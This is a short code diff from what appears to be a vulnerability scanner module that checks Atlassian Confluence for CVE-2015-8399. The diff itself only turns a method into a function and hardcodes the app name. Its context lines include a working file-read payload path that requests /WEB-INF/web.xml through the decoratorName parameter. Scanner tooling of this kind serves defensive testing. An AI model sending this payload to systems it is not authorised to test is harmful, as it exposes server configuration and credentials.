@@ -18,7 +18,7 @@ cve_2015_8399_payloads = [
     {'path': 'spaces/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml'},
 ]
 
-def cve_2015_8399_scan(self, clients):
+def cve_2015_8399_scan(clients):
     ''' Atlassian Confluence 5.8.17之前版本中存在安全, 
         该漏洞源于spaces/viewdefaultdecorator.action和admin/viewdefaultdecorator.action文件
         没有充分过滤'decoratorName'参数, 
@@ -27,7 +27,7 @@ def cve_2015_8399_scan(self, clients):
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'AtlassianConfluence',
         'vul_type': 'FileRead',
         'vul_id': 'CVE-2015-8399',
     }
